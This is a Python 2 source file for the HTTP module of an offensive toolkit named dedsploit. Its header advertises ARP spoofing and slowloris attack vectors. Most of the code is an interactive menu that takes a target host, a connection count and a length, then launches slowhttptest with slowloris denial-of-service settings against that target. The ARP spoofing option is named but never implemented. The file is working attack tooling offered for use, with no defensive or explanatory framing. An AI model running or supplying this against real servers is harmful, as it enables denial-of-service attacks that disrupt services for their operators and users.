'''

HTTP Module for dedsploit. Attack vectors include:
1. arpspoof
2. slowloris

'''
from core.mainLib import *


def http():
    print LISTMSG
    print http_menu
    while True:
        try:
            http_options = raw_input(LP + "[http] >> " + W )
            if http_options == "list":
                print http_menu
            elif http_options == "clear":
                os.system("clear")
            elif http_options == "exit":
                break
            elif http_options == "slowloris":
                slowloris_menu
                while True:
                    pre, slowoptions = raw_input(LP + "[http] slowloris >> " + W).split()
                    if pre == "target":
                        ip = "http://"+slowoptions
                        print "Target IP => ", ip
                        continue
                    elif pre == "connections":
                        socket_count = slowoptions
                        print "Connections => ", socket_count
                        continue
                    elif pre == "length":
                        length = slowoptions
                        print "Length => ", length
                        continue
                    elif pre == "start":
                        call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
                        break
        except ValueError:
            print WARNING
            continue
        except KeyboardInterrupt: # Ctrl + C to go back to main menu
            break
